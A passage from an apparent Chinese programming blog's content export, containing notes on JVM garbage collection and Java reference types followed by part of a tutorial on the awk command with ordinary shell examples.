Full GC**，同时对老年代和新生代进行回收，尝试释放被丢弃对象占用的内存。\n\n然而 System.gc() 调用附带一个免责声明，无法保证对垃圾收集器的调用。\n\n<!-- more -->\n\nJVM 实现者可以通过 System.gc() 调用来决定 JVM 的 GC 行为。而一般情况下，垃圾回收应该是自动进行的，无须手动触发，否则就太过于麻烦了。在一些特殊情况下，如我们正在编写一个性能基准，我们可以在运行之间调用 System.gc()。\n\n例子1：\n\n```java\npublic class SystemGCTest {\n\n    public static void main(String[] args) {\n        new SystemGCTest();\n        System.gc(); // 提醒 JVM 的垃圾回收器执行 GC\n\n        System.runFinalization(); // 强制调用未被使用对象的 finalize 方法\n    }\n\n    @Override\n    protected void finalize() throws Throwable {\n        super.finalize();\n        System.out.println(\"调用了重写的 finalize 方法\");\n    }\n}\n```\n\n例子2\n\n```java\n/**\n * -XX:+PrintGCDetails\n */\npublic class LocalVarGCTest {\n\n    public void fun1() {\n        byte[] buffer = new byte[10 * 1024 * 1024]; // 10M\n        System.gc(); // 不能回收\n    }\n\n    public void fun2() {\n        byte[] buffer = new byte[10 * 1024 * 1024]; // 10M\n        buffer = null;\n        System.gc(); // 可以回收\n    }\n\n    public void fun3() {\n        {\n            byte[] buffer = new byte[10 * 1024 * 1024]; // 10M\n        }\n        System.gc(); // 不能回收，局部变量表中仍然有引用\n    }\n\n    public void fun4() {\n        {\n            byte[] buffer = new byte[10 * 1024 * 1024]; // 10M\n        }\n        int value = 10;\n        System.gc(); // 可以回收，局部变量表中 value 和 buffer 使用同一个 Slot\n    }\n\n    public void fun5() {\n        fun1();\n        System.gc(); // 可以回收\n    }\n\n    public static void main(String[] args) {\n        LocalVarGCTest local = new LocalVarGCTest();\n        local.fun5();\n    }\n}\n```\n\n\n## 内存溢出与内存泄露\n\n### 内存溢出\n\n内存溢出相对于内存泄露来说，尽管更容易理解，但是同样的，内存溢出也是引发程序崩溃的罪魁祸首之一。\n\n由于 GC 一直在发展，所以一般情况下，除非应用程序占用的内存增长速度非常快，造成垃圾回收已经跟不上内存消耗的速度，否则不太容易出现 OOM 的情况。\n\n大多数情况下，GC 会进行各种年龄段的垃圾回收，实在不行了就放大招，来一次独占式的 Full GC 操作，这时候会回收大量的内存，供应用程序继续使用。\n\nJava Doc 中对 OutOfMemoryError 的解释是，**没有空闲内存，并且垃圾收集器也无法提供更多内存。**\n\n1.首先说没有空闲内存的情况：说明 Java 虚拟机的堆内存不够。原因有二：\n\n- Java 虚拟机的堆内存设置不够\n\n  比如：可能存在内存泄露问题：也很有可能就是堆的大小不合理，比如我们要处理比较可观的数据量，但是没有显示指定 JVM 堆大小或者指定数值偏小。我们可以通过 -Xms、-Xmx 来调整。\n\n- 代码中创建了大量大对象，并且长时间不能被垃圾收集器收集（存在引用）\n\n  对于老版本的 Oracle JDK，因为永久代的大小时有限的，并且 JVM 对永久代垃圾回收（如，常量池回收、卸载不再需要的类型）非常不积极，所以当我们不断添加新类型的时候，永久代出现 OOM 也非常多见，尤其是在运行时存在大量动态类型生成的场合；类似 intern 字符串缓存占用太多空间，也会导致 OOM 问题。对应的异常信息，会标记出来和永久代相关：\"java.lang.OutOfMemoryError: PermGen Space\"\n\n  随着元数据区的引入，方法区内存已经不再那么窘迫，所以相应的 OOM 有所改观，出现 OOM 异常的信息则变成了 \"java.lang.OutOfMemoryError: Metaspace\"。直接内存不足，也会导致 OOM。\n\n2.垃圾收集器无法提供更多内存，这里面隐含着一层意思是，在抛出 OOM 之前，通常垃圾收集器会被触发，尽其所能去清理出空间。\n\n- 例如：在引用机制分析中，涉及到 JVM 会去尝试回收软引用指向的对象等。\n- 在 java.nio.BITs.reserveMemory() 方法中，我们能清楚地看到，System.gc() 会被调用，以清理空间。\n\n当然，也不是在任何情况下垃圾收集器都会被触发的。\n\n- 比如，我们去分配一个超大对象。类似一个超大数组超过堆的最大值，JVM 可以判断出垃圾收集并不能解决这个问题，所以直接抛出 OOM。\n\n### 内存泄露\n\n内存泄露也称作 存储渗漏。严格来说，**只有对象不会再被程序用到了，但是 GC 又不能回收他们的情况，才叫内存泄露**。\n\n但实际情况很多时候一些不太好的实践（或疏忽）会导致对对象的生命周期变得很长甚至导致 OOM，也可以叫做宽泛意义上的内存泄露。\n\n尽管内存泄露并不会立刻引起程序崩溃，但是一旦发生内存泄露，程序中的可用内存就会被逐步蚕食，直至耗尽所有内存，最终出现 OOM 异常，导致程序崩溃。\n\n注意，这里的存储空间并不是指物理内存，而是指虚拟内存大小，这个虚拟内存大小决定于磁盘交换区设定的大小。\n\n举例：\n\n1.单例模式\n\n单例的生命周期和应用程序是一样长的，所以单例程序中，如果持有对外部对象的引用的话，那么这个外部对象是不能被回收的，则会导致内存泄露的产生。\n\n2.一些提供 close 的资源未关闭导致内存泄露\n\n数据库连接（dataSource.getConnection()），网络连接（socket）和 io 连接必须手动 close，否则是不能被回收的。\n\n\n\n## Stop The World\n\nStop The World，简称 STW，指的是 GC 事件发生过程中，会产生应用程序的停顿。停顿产生时整个应用程序线程都会被暂停，没有任何响应，有点像卡死的感觉，这个停顿称为 STW。\n\n- 可达性分析算法中枚举根节点（GC Roots）会导致所有 Java 执行线程停顿。\n  - 分析工作必须在一个能确保一致性的快照中进行\n  - 一致性指整个分析期间整个执行系统看起来像被冻结在某个时间点上\n  - 如果出现分析过程中对象引用关系还在不断变化，则分析结果的准确性无法保证。=\n\n被 STW 中断的应用程序线程会在完成 GC 之后恢复，频繁中断会让用户感觉像是网速不快造成电影卡带一样，所以我们需要减少 STW 的发生。\n\n\n\nSTW 事件和采用哪款 GC 无关，所有的 GC 都有这个事件。\n\n哪怕是 G1 也不能完全避免 STW 情况发生，只能说垃圾回收器越来越优秀，回收效率越来越高，尽可能得缩短了暂停时间。\n\nSTW 是 JVM 在后台自动发起和自动完成的。在用户不可见的情况下，把用户正常的工作线程全部停掉。\n\n开发中不要用 System.gc()；会导致 STW 的发生。\n\n代码示例：\n\n```java\nimport java.util.ArrayList;\nimport java.util.List;\n\npublic class StopTheWorldTest {\n\n    public static void main(String[] args) {\n        WorkThread workThread = new WorkThread();\n        PrintThread printThread = new PrintThread();\n        workThread.start();\n        printThread.start();\n    }\n\n    public static class WorkThread extends Thread {\n        List<byte[]> list = new ArrayList<>();\n\n        @Override\n        public void run() {\n            while (true) {\n                for (int i = 0; i < 1000; i++) {\n                    byte[] buffer = new byte[1000];\n                    list.add(buffer);\n                }\n                if (list.size() > 10000) {\n                    list.clear();\n                    System.gc(); // 触发 Full GC，引发 STW\n                }\n            }\n        }\n    }\n\n    public static class PrintThread extends Thread {\n        public final long startTime = System.currentTimeMillis();\n\n        @Override\n        public void run() {\n            try {\n                while (true) {\n                    long t = System.currentTimeMillis() - startTime;\n                    System.out.println(t / 1000 + \".\" + t % 1000);\n                    Thread.sleep(1000);\n                }\n            } catch (InterruptedException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n}\n```\n\n\n\n## 垃圾回收的并行与并发\n\n### 并发（Concurrent）\n\n在操作系统中，是指一个时间段中有几个程序都处于已启动运行到运行完毕之间，且这几个程序都是在同一个处理器上运行。\n\n并发不是真正意义上的“同时进行”，只是 CPU 把一个时间段划分成几个时间片段（时间区间），然后在这几个时间区间之间来回切换，由于 CPU 处理的速度非常快，只要时间间隔处理得当，即可让用户感觉是多个应用程序同时在进行。\n\n### 并行（Parallel）\n\n当系统有一个以上 CPU 时，当一个 CPU 执行一个进程时，另一个 CPU 可以执行另一个进程，两个进行互不抢占 CPU 资源，可以同时进行，我们称之为并行。\n\n其实决定并行的因素不是 CPU 的数量，而是 CPU 的核心数量，比如一个 CPU 多个核也可以并行。\n\n适合科学计算，后台处理等弱交互场景。\n\n### 并发 vs 并行\n\n并发，指的是多个事情，在同一时间段内同时发生了。\n\n并行，指的是多个事情，在同一时间点上同时发生了。\n\n\n\n并发的多个任务之间是互相抢占资源的，\n\n并行的多个任务之间是不互相抢占资源的。\n\n\n\n只有在多 CPU 或者一个 CPU 多核的情况中，才会发生并行。\n\n否则，看似同时发生的事情，其实都是并发执行的，\n\n### 垃圾回收的并发与并行\n\n并发和并行，在谈论垃圾收集器的上下午语境中，它们可以解释如下：\n\n- 并行：只多条垃圾收集线程并行工作，但此时用户线程仍处于等待状态。\n  - 如 ParNew、Parallel Scavenge、Parallel Old\n- 串行\n  - 相较于并行的概念，单线程执行。\n  - 如果内存不够，则程序暂停，启动 JVM 垃圾回收器进行垃圾回收。回收完，再启动程序的线程。\n- 并发：指用户线程与垃圾收集线程同时执行（但不一定是并行的，可能会交替执行），垃圾回收线程在执行时不会停顿用户程序的运行。\n  - 用户程序在继续运行，而垃圾收集程序线程运行于另一个 CPU 上。\n  - 如：CMS、G1\n\n## 安全点与安全区域\n\n### 安全点（Safe Point）\n\n程序执行时并非在所有的地方都可以停顿下来开始 GC，只有在特定位置才能停顿下来开始 GC，这些位置称为 安全点（Safe Point）。\n\nSafe Point 的选择很重要，**如果太少可能导致 GC 等待的时间太长，如果太频繁可能导致运行时的性能问题**。大部分指令的执行时间都非常短暂，通常会根据 “是否具有让程序长时间执行的特性” 为标准。比如：选择一些执行时间较长的指令作为 Safe Point，如**方法调用、循环跳转和异常跳转**等。\n\n如何在 GC 发生时，检查所有线程都跑到最近的安全点停顿下来呢？\n\n- 抢占式中断：（目前没有虚拟机采用了）\n\n  首先中断所有线程，如果还有线程不在安全点，就恢复线程，让线程跑到安全点。\n\n- 主动式中断：\n\n  设置一个中断标志，各个线程运行到 Safe Point 的时候主动轮询到这个标志，如果中断标志为真，则将自己进行中断挂起。\n\n### 安全区域（Safe Region）\n\nSafe Point 机制保证了程序执行时，在不太长的时间内就会遇到可进入 GC 的 Safe Point。但是，程序 “不执行” 的时候呢？例如线程处于 Sleep 状态或 Blocked 状态，这个时候线程无法响应 JVM 的中断请求，“走” 到安全点去中断挂起，JVM 也不太可能等待线程被唤醒。对于这种情况，就需要安全区域（Safe Region）来解决。\n\n**安全区域是指在一段代码片段中，对象的引用关系不会发生变化，在这个区域中的任何位置开始 GC 都是安全的。**我们也可以把 Safe Region 看做是拓展了的 Safe Point。\n\n实际执行时：\n\n- 当线程运行到 Safe Region 的代码时，首先标识已经进入了 Safe Region，如果这段时间内发生 GC，JVM 会忽略标识为 Safe Region 状态的线程。\n- 当线程离开 Safe Region 时，会检查 JVM 是否已经完成 GC，如果完成了，则继续运行，否则线程必须等待直到收到可以安全离开 Safe Region 的信号为止。\n\n---\n\n## 再谈引用\n\n我们希望能描述这样一类对象：当内存空间还足够时，则能保留在内存中；如果内存空间在进行垃圾收集后还是很紧张，则可以抛弃这些对象。\n\n【既偏门又非常高频的面试题】强引用、软引用、弱引用、虚引用有什么区别？具体使用场景是什么？\n\n在 JDK 1.2 版本后，Java 对引用的概念进行了扩充，将引用分为强引用（Strong Reference）、软引用（Soft Reference）、弱引用（Weak Preference）和虚引用（Phantom Reference）4 种，这 4 种引用强度依次逐渐减弱。\n\n除强引用外，其他 3 种引用均可以在 java.lang.ref 包中找到它们的身影。如下图，显示了这 3 种引用类型对应的类，开发人员可以在应用程序中直接使用它们。\n\nReference 子类中只有终结器引用是包内可见的，其他 3 种类型均为 public，可以在应用程序中直接使用。\n\n- 强引用：最传统的引用的定义，是指在程序代码之中普遍存在的引用赋值，即类似 \"Object obj = new Object()\" 这种引用关系。**无论任何情况下，只要强引用关系还在，垃圾收集器就永远不会回收掉被引用的对象。**\n- 软引用：在系统将要发生内存溢出之前，将会把这些对象列入回收范围之中进行第二次回收。如果这次回收后还没有足够的内存，才会抛出内存溢出异常。\n- 弱引用：被弱引用关联的对象只能生存到下一次垃圾收集之前。当垃圾收集器工作时，无论内存空间是否足够，都会回收掉被弱引用关联的对象。\n- 虚引用：一个对象是否有虚引用的存在，完全不会对其生存时间构成影响，也无法通过虚引用来获得一个对象的实例。**为一个对象设置虚引用关联的唯一目的就是能在这个对象被收集器回收时收到一个系统通知。**\n\n\n\n## 再谈引用：强引用（不回收）\n\n在 Java 程序中，最常见的引用类型是强引用（普通对象99%以上都是强引用），也就是我们最常见的普通对象引用，也就是默认的引用类型。\n\n当在 Java 语言中使用 new 操作符创建一个新的对象，并将其赋值给一个变量的时候，这个变量就成为指向该对象的一个强引用。\n\n强引用的对象是可触及的，垃圾回收器就永远不会回收掉被引用的对象。\n\n对于一个普通的对象，如果没有其他的引用关系，只要超过了引用的作用域或者显式地将相应（强）引用赋值为 null，就是可以当做垃圾被收集了，当然具体回收时机还是要看垃圾收集策略。\n\n相对的，软引用、弱引用和虚引用的对象是软可触及、弱可触及的，在一定条件下，都是可以被回收的。所以，强引用时造成 Java 内存泄露的主要原因之一。\n\n例子：\n\n```java\nStringBuffer stringBuffer = new StringBuffer(\"强引用\");\n```\n\n强引用具备以下特点：\n\n- 强引用可以直接访问目标对象。\n- 强引用所指向的对象在任何时候都不会被系统回收，虚拟机宁愿抛出 OOM 异常，也不会回收强引用所指向对象。\n- 强引用可能导致内存泄露。\n\n\n\n## 再谈引用：软引用（内存不足即回收）\n\n软引用是用来描述一些还有用，但是非必需的对象。只要被软引用关联着的对象，在系统将要发生内存溢出异常前会把这些对象列进回收范围之中进行第二次回收，如果这次回收还没有足够的内存，才会抛出内存溢出异常。\n\n软引用通常用来实现内存敏感的缓存。比如：高速缓存（如，MyBatis 的缓存）就有用到软引用。如果还有空闲内存，就可以暂时保留缓存，当内存不足时清理掉，这样就能保证了使用缓存的同时，不会耗尽内存。\n\n垃圾回收器在某个时刻决定回收软可达的对象的时候，会清理软引用，并可选地把引用存放到一个引用队列（Reference Queue）。\n\n类似弱引用，只不过 Java 虚拟机会尽量让软引用的存活时间长一些，迫不得已才清理。\n\n例子：\n\n```java\nObject obj = new Object(); // 声明强引用\nSoftReference<Object> sr = new SoftReference<>(obj);\nobj = null; // 销毁强引用\n```\n\n\n\n## 再谈引用：弱引用（发现即回收）\n\n弱引用也是用来描述那些非必需对象，**只**被弱引用关联的对象**只能生存到下一次垃圾收集发生为止**。在系统 GC 时，只要发现弱引用，不管系统堆空间使用是否充足，都会回收掉只被弱引用关联的对象。\n\n但是，由于垃圾回收器的线程通常优先级低，因此，并不一定能很快地发现持有弱引用的对象。在这种情况下，弱引用对象可以存在较长的时间。\n\n弱引用和软引用一样，在构造弱引用同时，也可以指定一个引用队列，当弱引用对象被回收时，就会加入指定的引用队列，通过这个队列可以跟踪对象的回收情况。\n\n**软引用、弱引用都非常适合来保存那些可有可无的缓存数据。**如果这么做，当系统内存不足时，这些缓存数据就会被回收，不会导致内存溢出。而当内存资源充足时，这些缓存数据又可以存在相当长的时间，从而起到加速系统的作用。\n\n例子\n\n```java\nObject obj = new Object(); // 声明强引用\nWeakReference<Object> wr = new WeakReference<>(obj);\nobj = null; // 销毁强引用\n```\n\n弱引用对象与软引用对象最大的不同就在于，当 GC 在进行回收时，需要通过算法检查是够回收软引用对象，而对于弱引用，GC 总是进行回收。弱引用对象更容易、更快被 GC 回收。\n\n面试题：开发中使用过 WeakHashMap 吗？\n\n图片缓存等。\n\n## 再谈引用：虚引用（对象回收跟踪）\n\n也称为 “幽灵引用” 或者 “幻影引用”，是所有引用类型中最弱的一个。\n\n一个对象是否有虚引用的存在，完全不会决定对象的生命周期。如果一个对象仅持有虚引用，那么它和没有引用几乎是一样的，随时都可能被垃圾回收器回收。\n\n它不能单独使用，也无法通过虚引用来获取被引用的对象。当试图通过虚引用的 get() 方法取得对象时，总是 null。\n\n为一个对象设置虚引用关联的唯一目的在于跟踪垃圾回收过程。比如：能在这个对象被收集器回收时收到一个系统通知。\n\n\n\n虚引用必须和引用队列一起使用。虚引用在创建时必须提供一个引用队列作为参数。当垃圾回收器准备回收一个对象时，如果发现它还有虚引用，就会回收对象后，将这个虚引用加入引用队列，以通知应用程序对象回收情况。\n\n由于虚引用可以跟踪对象的回收时间，因此，也可以将一些资源释放操作放置在虚引用中执行和记录。\n\n```java\nObject obj = new Object(); // 声明强引用\nReferenceQueue phantomQueue = new ReferenceQueue();\nPhantomReference<Object> pr = new PhantomReference<>(obj, phantomQueue);\nobj = null; // 销毁强引用\n```\n\n\n## 再谈引用：终结器引用\n\n它用于实现对象的 finalize 方法，也可以称为终结器引用。\n\n无需手动编码，其内部配合引用队列使用。\n\n在 GC 时，终结器引用入队。由 Finalizer 线程通过终结器引用找到被引用对象并调用它的 finalize 方法，第二次 GC 时才能回收被引用对象。","categories":["Java进阶"],"tags":["Java进阶","JVM"]},{"title":"【Linux 命令】awk","url":"/linux-command/awk/","content":"\n文本和数据进行处理的编程语言\n\n## 补充说明\n\n**awk** 是一种编程语言，用于在linux/unix下对文本和数据进行处理。数据可以来自标准输入(stdin)、一个或多个文件，或其它命令的输出。它支持用户自定义函数和动态正则表达式等先进功能，是linux/unix下的一个强大编程工具。它在命令行中使用，但更多是作为脚本来使用。awk有很多内建的功能，比如数组、函数等，这是它和C语言的相同之处，灵活性是awk最大的优势。\n\n## awk命令格式和选项  \n\n**语法形式** \n\n```shell\nawk [options] 'script' var=value file(s)\nawk [options] -f scriptfile var=value file(s)\n```\n\n**常用命令选项** \n\n*  **-F fs** fs指定输入分隔符，fs可以是字符串或正则表达式，如-F:，默认的分隔符是连续的空格或制表符\n*  **-v var=value** 赋值一个用户定义变量，将外部变量传递给awk\n*  **-f scripfile** 从脚本文件中读取awk命令\n*  **-m[fr] val** 对val值设置内在限制，-mf选项限制分配给val的最大块数目；-mr选项限制记录的最大数目。这两个功能是Bell实验室版awk的扩展功能，在标准awk中不适用。\n\n## awk模式和操作  \n\nawk脚本是由模式和操作组成的。\n\n###  模式 \n\n模式可以是以下任意一个：\n\n* /正则表达式/：使用通配符的扩展集。\n* 关系表达式：使用运算符进行操作，可以是字符串或数字的比较测试。\n* 模式匹配表达式：用运算符`~`（匹配）和`!~`（不匹配）。\n* BEGIN语句块、pattern语句块、END语句块：参见awk的工作原理\n\n###  操作 \n\n操作由一个或多个命令、函数、表达式组成，之间由换行符或分号隔开，并位于大括号内，主要部分是：\n\n* 变量或数组赋值\n* 输出命令\n* 内置函数\n* 控制流语句\n\n## awk脚本基本结构  \n\n```shell\nawk 'BEGIN{ print \"start\" } pattern{ commands } END{ print \"end\" }' file\n```\n\n一个awk脚本通常由：BEGIN语句块、能够使用模式匹配的通用语句块、END语句块3部分组成，这三个部分是可选的。任意一个部分都可以不出现在脚本中，脚本通常是被 **单引号** 或 **双引号** 中，例如：\n\n```shell\nawk 'BEGIN{ i=0 } { i++ } END{ print i }' filename\nawk \"BEGIN{ i=0 } { i++ } END{ print i }\" filename\n```\n\n###  awk的工作原理 \n\n```shell\nawk 'BEGIN{ commands } pattern{ commands } END{ commands }'\n```\n\n*   第一步：执行`BEGIN{ commands }`语句块中的语句；\n*   第二步：从文件或标准输入(stdin)读取一行，然后执行`pattern{ commands }`语句块，它逐行扫描文件，从第一行到最后一行重复这个过程，直到文件全部被读取完毕。\n*   第三步：当读至输入流末尾时，执行`END{ commands }`语句块。\n\n **BEGIN语句块** 在awk开始从输入流中读取行 **之前** 被执行，这是一个可选的语句块，比如变量初始化、打印输出表格的表头等语句通常可以写在BEGIN语句块中。\n\n **END语句块** 在awk从输入流中读取完所有的行 **之后** 即被执行，比如打印所有行的分析结果这类信息汇总都是在END语句块中完成，它也是一个可选语句块。\n\n **pattern语句块** 中的通用命令是最重要的部分，它也是可选的。如果没有提供pattern语句块，则默认执行`{ print }`，即打印每一个读取到的行，awk读取的每一行都会执行该语句块。\n\n **示例** \n\n```shell\necho -e \"A line 1\\nA line 2\" | awk 'BEGIN{ print \"Start\" } { print } END{ print \"End\" }'\nStart\nA line 1\nA line 2\nEnd\n```\n\n当使用不带参数的`print`时，它就打印当前行，当`print`的参数是以逗号进行分隔时，打印时则以空格作为定界符。在awk的print语句块中双引号是被当作拼接符使用，例如：\n\n```shell\necho | awk '{ var1=\"v1\"; var2=\"v2\"; var3=\"v3\"; print var1,var2,var3; }' \nv1 v2 v3\n```\n\n双引号拼接使用：\n\n```shell\necho | awk '{ var1=\"v1\"; var2=\"v2\"; var3=\"v3\"; print var1\"=\"var2\"=\"var3; }'\nv1=v2=v3\n```\n\n{ }类似一个循环体，会对文件中的每一行进行迭代，通常变量初始化语句（如：i=0）以及打印文件头部的语句放入BEGIN语句块中，将打印的结果等语句放在END语句块中。\n\n## awk内置变量（预定义变量）  \n\n说明：[A][N][P][G]表示第一个支持变量的工具，[A]=awk、[N]=nawk、[P]=POSIXawk、[G]=gawk\n\n```shell\n **$n**  当前记录的第n个字段，比如n为1表示第一个字段，n为2表示第二个字段。 \n **$0**  这个变量包含执行过程中当前行的文本内容。\n[N]  **ARGC**  命令行参数的数目。\n[G]  **ARGIND**  命令行中当前文件的位置（从0开始算）。\n[N]  **ARGV**  包含命令行参数的数组。\n[G]  **CONVFMT**  数字转换格式（默认值为%.6g）。\n[P]  **ENVIRON**  环境变量关联数组。\n[N]  **ERRNO**  最后一个系统错误的描述。\n[G]  **FIELDWIDTHS**  字段宽度列表（用空格键分隔）。\n[A]  **FILENAME**  当前输入文件的名。\n[P]  **FNR**  同NR，但相对于当前文件。\n[A]  **FS**  字段分隔符（默认是任何空格）。\n[G]  **IGNORECASE**  如果为真，则进行忽略大小写的匹配。\n[A]  **NF**  表示字段数，在执行过程中对应于当前的字段数。\n[A]  **NR**  表示记录数，在执行过程中对应于当前的行号。\n[A]  **OFMT**  数字的输出格式（默认值是%.6g）。\n[A]  **OFS**  输出字段分隔符（默认值是一个空格）。\n[A]  **ORS**  输出记录分隔符（默认值是一个换行符）。\n[A]  **RS**  记录分隔符（默认是一个换行符）。\n[N]  **RSTART**  由match函数所匹配的字符串的第一个位置。\n[N]  **RLENGTH**  由match函数所匹配的字符串的长度。\n[N]  **SUBSEP**  数组下标分隔符（默认值是34）。\n```\n\n转义序列\n\n```\n\\\\ \\自身\n\\$ 转义$\n\\t 制表符\n\\b 退格符\n\\r 回车符\n\\n 换行符\n\\c 取消换行\n```\n\n**示例** \n\n```shell\necho -e \"line1 f2 f3\\nline2 f4 f5\\nline3 f6 f7\" | awk '{print \"Line No:\"NR\", No of fields:\"NF, \"$0=\"$0, \"$1=\"$1, \"$2=\"$2, \"$3=\"$3}' \nLine No:1, No of fields:3 $0=line1 f2 f3 $1=line1 $2=f2 $3=f3\nLine No:2, No of fields:3 $0=line2 f4 f5 $1=line2 $2=f4 $3=f5\nLine No:3, No of fields:3 $0=line3 f6 f7 $1=line3 $2=f6 $3=f7\n```\n\n使用`print $NF`可以打印出一行中的最后一个字段，使用`$(NF-1)`则是打印倒数第二个字段，其他以此类推：\n\n```shell\necho -e \"line1 f2 f3\\n line2 f4 f5\" | awk '{print $NF}'\nf3\nf5\n```\n\n```shell\necho -e \"line1 f2 f3\\n line2 f4 f5\" | awk '{print $(NF-1)}'\nf2\nf4\n\n```\n\n打印每一行的第二和第三个字段：\n\n```shell\nawk '{ print $2,$3 }' filename\n```\n\n统计文件中的行数：\n\n```shell\nawk 'END{ print NR }' filename\n```\n\n以上命令只使用了END语句块，在读入每一行的时，awk会将NR更新为对应的行号，当到达最后一行NR的值就是最后一行的行号，所以END语句块中的NR就是文件的行数。\n\n一个每一行中第一个字段值累加的例子：\n\n```shell\nseq 5 | awk 'BEGIN{ sum=0; print \"总和：\" } { print $1\"+\"; sum+=$1 } END{ print \"等于\"; print sum }' \n总和：\n1+\n2+\n3+\n4+\n5+\n等于\n15\n```\n\n## 将外部变量值传递给awk  \n\n借助 **`-v`选项** ，可以将外部值（并非来自stdin）传递给awk：\n\n```shell\nVAR=10000\necho | awk -v VARIABLE=$VAR '{ print VARIABLE }'\n```\n\n另一种传递外部变量方法：\n\n```shell\nvar1=\"aaa\"\nvar2=\"bbb\"\necho | awk '{ print v1,v2 }' v1=$var1 v2=$var2\n```\n\n当输入来自于文件时使用：\n\n```shell\nawk '{ print v1,v2 }' v1=$var1 v2=$var2 filename\n```\n\n以上方法中，变量之间用空格分隔作为awk的命令行参数跟随在BEGIN、{}和END语句块之后。\n\n## 查找进程pid\n\n```shell\nnetstat -antup | grep 7770 | awk '{ print $NF NR}' | awk '{ print $1}'\n```\n\n## awk运算与判断  \n\n作为一种程序设计语言所应具有的特点之一，awk支持多种运算，这些运算与C语言提供的基本相同。awk还提供了一系列内置的运算函数（如log、sqr、cos、sin等）和一些用于对字符串进行操作（运算）的函数（如length、substr等等）。这些函数的引用大大的提高了awk的运算功能。作为对条件转移指令的一部分，关系判断是每种程序设计语言都具备的功能，awk也不例外，awk中允许进行多种测试，作为样式匹配，还提供了模式匹配表达式~（匹配）和!~（不匹配）。作为对测试的一种扩充，awk也支持用逻辑运算符。\n\n###  算术运算符 \n\n| 运算符 | 描述 |\n| ----- | ---- |\n| + - | 加，减 |\n| * / & | 乘，除与求余 |\n| + - ! | 一元加，减和逻辑非 |\n| ^ *** | 求幂 |\n| ++ -- | 增加或减少，作为前缀或后缀 |\n\n例：\n\n```shell\nawk 'BEGIN{a=\"b\";print a++,++a;}'\n0 2\n```\n\n注意：所有用作算术运算符进行操作，操作数自动转为数值，所有非数值都变为0\n\n###  赋值运算符 \n\n| 运算符 | 描述 |\n| ----- | ---- |\n| = += -= *= /= %= ^= **= | 赋值语句 |\n\n例：\n\n```shell\na+=5; 等价于：a=a+5; 其它同类\n```\n\n###  逻辑运算符 \n\n| 运算符 | 描述 |\n| ----- | ---- |\n| `\\|\\|` | 逻辑或 |\n| && | 逻辑与 |\n\n例：\n\n```shell\nawk 'BEGIN{a=1;b=2;print (a>5 && b<=2),(a>5 || b<=2);}'\n0 1\n```\n\n###  正则运算符 \n\n| 运算符 | 描述 |\n| ----- | ---- |\n| ~ !~ | 匹配正则表达式和不匹配正则表达式 |\n\n```\n^ 行首\n$ 行尾\n. 除了换行符以外的任意单个字符\n* 前导字符的零个或多个\n.* 所有字符\n[] 字符组内的任一字符\n[^]对字符组内的每个字符取反(不匹配字符组内的每个字符)\n^[^] 非字符组内的字符开头的行\n[a-z] 小写字母\n[A-Z] 大写字母\n[a-Z] 小写和大写字母\n[0-9] 数字\n\\< 单词头单词一般以空格或特殊字符做分隔,连续的字符串被当做单词\n\\> 单词尾\n```\n\n> 正则需要用 /正则/ 包围住\n\n例：\n\n```shell\nawk 'BEGIN{a=\"100testa\";if(a ~ /^100*/){print \"ok\";}}'\nok\n```\n\n###  关系运算符 \n\n| 运算符 | 描述 |\n| ----- | ---- |\n| < <= > >= != == | 关系运算符 |\n\n例：\n\n```shell\nawk 'BEGIN{a=11;if(a >= 9){print \"ok\";}}'\nok\n```\n\n注意：> < 可以作为字符串比较，也可以用作数值比较，关键看操作数如果是字符串就会转换为字符串比较。两个都为数字才转为数值比较。字符串比较：按照ASCII码顺序比较。\n\n###  其它运算符 \n\n| 运算符 | 描述 |\n| ----- | ---- |\n| $ | 字段引用 |\n| 空格 | 字符串连接符 |\n| ?: | C条件表达式 |\n| in | 数组中是否存在某键值 |\n\n例：\n\n```shell\nawk 'BEGIN{a=\"b\";print a==\"b\"?\"ok\":\"err\";}'\nok\n```\n\n```shell\nawk 'BEGIN{a=\"b\";arr[0]=\"b\";arr[1]=\"c\";print (a in arr);}'\n0\n```\n\n```\nawk 'BEGIN{a=\"b\";arr[0]=\"b\";arr[\"b\"]=\"c\";print (a in arr);}'\n1\n```\n\n###  运算级优先级表 \n\n!级别越高越优先  \n级别越高越优先\n\n## awk高级输入输出  \n\n###  读取下一条记录 \n\nawk中`next`语句使用：在循环逐行匹配，如果遇到next，就会跳过当前行，直接忽略下面语句。而进行下一行匹配。next语句一般用于多行合并：\n\n```shell\ncat text.txt\na\nb\nc\nd\ne\n\nawk 'NR%2==1{next}{print NR,$0;}' text.txt\n2 b\n4 d\n```\n\n当记录行号除以2余1，就跳过当前行。下面的`print NR,$0`也不会执行。下一行开始，程序有开始判断`NR%2`值。这个时候记录行号是`：2` ，就会执行下面语句块：`'print NR,$0'`\n\n分析发现需要将包含有“web”行进行跳过，然后需要将内容与下面行合并为一行：\n\n```shell\ncat text.txt\nweb01[192.168.2.100]\nhttpd            ok\ntomcat               ok\nsendmail               ok\nweb02[192.168.2.101]\nhttpd            ok\npostfix               ok\nweb03[192.168.2.102]\nmysqld            ok\nhttpd               ok\n0\nawk '/^web/{T=$0;next;}{print T\":\"t,$0;}' text.txt\nweb01[192.168.2.100]:   httpd            ok\nweb01[192.168.2.100]:   tomcat               ok\nweb01[192.168.2.100]:   sendmail               ok\nweb02[192.168.2.101]:   httpd            ok\nweb02[192.168.2.101]:   postfix               ok\nweb03[192.168.2.102]:   mysqld            ok\nweb03[192.168.2.102]:   httpd               ok\n```\n\n###  简单地读取一条记录 \n\n`awk getline`用法：输出重定向需用到`getline函数`。getline从标准输入、管道或者当前正在处理的文件之外的其他输入文件获得输入。它负责从输入获得下一行的内容，并给NF,NR和FNR等内建变量赋值。如果得到一条记录，getline函数返回1，如果到达文件的末尾就返回0，如果出现错误，例如打开文件失败，就返回-1。\n\ngetline语法：getline var，变量var包含了特定行的内容。\n\nawk getline从整体上来说，用法说明：\n\n* **当其左右无重定向符`|`或`<`时：** getline作用于当前文件，读入当前文件的第一行给其后跟的变量`var`或`$0`（无变量），应该注意到，由于awk在处理getline之前已经读入了一行，所以getline得到的返回结果是隔行的。\n* **当其左右有重定向符`|`或`<`时：** getline则作用于定向输入文件，由于该文件是刚打开，并没有被awk读入一行，只是getline读入，那么getline返回的是该文件的第一行，而不是隔行。\n\n**示例：** \n\n执行linux的`date`命令，并通过管道输出给`getline`，然后再把输出赋值给自定义变量out，并打印它：\n\n```shell\nawk 'BEGIN{ \"date\" | getline out; print out }' 